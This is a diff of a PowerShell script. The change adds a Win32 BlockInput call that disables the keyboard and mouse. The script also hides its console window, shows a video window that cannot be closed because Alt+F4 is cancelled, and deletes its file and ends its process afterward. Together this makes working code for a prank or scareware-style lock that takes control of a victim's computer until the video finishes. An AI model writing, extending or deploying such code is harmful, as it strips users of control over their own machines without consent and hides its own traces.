@@ -1,7 +1,16 @@
 try {
-    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
-    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
+    # 1. API for Hiding Window and Blocking Input
+    $c = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
+    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
+'@
+    $t = Add-Type -MemberDefinition $c -Name "Win32" -Namespace "Win" -PassThru
+    
+    # Hide Console
     $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
+    
+    # BLOCK KEYBOARD AND MOUSE
+    $t::BlockInput($true)
 } catch {}
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -25,20 +34,27 @@ try {
     $w = [Windows.Markup.XamlReader]::Load($reader)
     $v = $w.FindName("v")
 
-    # This part handles auto-close when video finished
+    # When video ends: Unblock input and close
     $v.add_MediaEnded({
+        $t::BlockInput($false)
         $w.Close()
     })
 
-    # This part blocks Alt+F4
+    # Block Alt+F4
     $w.Add_Closing({
         $_.Cancel = $true
     })
 
     $w.ShowDialog() | Out-Null
 } 
-catch { exit }
+catch {
+    # If error occurs, ensure keyboard is unblocked before exit
+    if ($t) { $t::BlockInput($false) }
+    exit
+}
 finally {
+    # Safety Unblock
+    if ($t) { $t::BlockInput($false) }
     Start-Sleep -Seconds 1
     if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
     Stop-Process -Id $pid -Force
